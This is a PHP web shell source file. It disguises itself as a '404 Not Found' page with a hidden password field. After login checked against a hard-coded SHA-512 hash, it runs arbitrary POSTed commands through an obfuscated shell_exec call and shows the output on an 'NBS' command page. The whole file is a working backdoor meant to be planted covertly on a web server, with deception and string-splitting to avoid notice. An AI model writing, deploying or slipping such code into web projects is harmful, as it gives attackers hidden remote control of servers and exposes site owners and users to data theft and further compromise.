<?php
session_start();

if(isset($_SESSION['expire']) && isset($_SESSION['nbs_logged_in']) && $_SESSION['start']) {
    $now = time();

    if ($now > $_SESSION['expire']) {
        session_destroy();
        echo "Your session has expired!";
    }
}

if (!empty($_POST['pass']) && !isset($_SESSION['nbs_logged_in'])) {
    if (hash('sha512', $_POST['pass']) === "b5d42217df5bf6e4913ae77354039bb2874547d4678e3bf1a10e45328bf4428c252210eabf66eb407e61fe478ea04c471bb1130394076e5a785861ee88a2537f") {
        $_SESSION['nbs_logged_in'] = true;
        $_SESSION['start'] = time();
        $_SESSION['expire'] = $_SESSION['start'] + (30 * 60);
    }
}

if (!empty($_POST['cmd']) && isset($_SESSION['nbs_logged_in'])) {
    $bla='sh'.'ell_exec';
    $cmd =$bla($_POST['cmd']);
}
?>

<?php
    if(!isset($_SESSION['nbs_logged_in'])){
    ?>

    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html>
        <head>
            <title>404 Not Found</title>
            <style>
                input {border:0;outline:0;}
                input:focus {outline:none!important;}
            </style>
        </head>
        <body>
            <h1>Not Found</h1>
            <p>The requested URL was not found on this server..</p>
            <hr>

            <form method="post">
                <input type="password" name="pass" id="pass" >
            </form>
        </body>
    </html>

    <?php
    }else {
        ?>
        <!DOCTYPE html>
        <html lang="en">

        <head>
            <meta charset="utf-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Error</title>
            <style>
                * {
                    -webkit-box-sizing: border-box;
                    box-sizing: border-box;
                }

                body {
                    font-family: sans-serif;
                    color: rgba(0, 0, 0, .75);
                }

                main {
                    margin: auto;
                    max-width: 850px;
                }

                pre,
                input,
                button {
                    border-radius: 5px;
                }

                pre,
                input,
                button {
                    background-color: #efefef;
                }

                label {
                    display: block;
                }

                input {
                    width: 100%;
                    background-color: #efefef;
                    border: 2px solid transparent;
                }

                input:focus {
                    outline: none;
                    background: transparent;
                    border: 2px solid #e6e6e6;
                }

                button {
                    border: none;
                    cursor: pointer;
                    margin-left: 5px;
                }

                button:hover {
                    background-color: #e6e6e6;
                }

                pre,
                input,
                button {
                    padding: 10px;
                }

                .form-group {
                    display: -webkit-box;
                    display: -ms-flexbox;
                    display: flex;
                    padding: 15px 0;
                }
            </style>

        </head>

        <body>
            <main>
                <div>
                <h1>NBS</h1>
                <h2>Execute a command</h2>

                <form method="post">
                    <label for="cmd"><strong>Command</strong></label>
                    <div class="form-group">
                        <input type="text" name="cmd" id="cmd" value="<?= isset($_POST["cmd"]) ? htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') : ""?>"
                            onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                        <button type="submit">Execute</button>
                    </div>
                </form>

                <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
                    <h2>Output</h2>
                    <?php if (isset($cmd)): ?>
                        <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
                    <?php else: ?>
                        <pre><small>No result.</small></pre>
                    <?php endif; ?>
                <?php endif; ?>
                </div>
            </main>
        </body>
        <?php
    }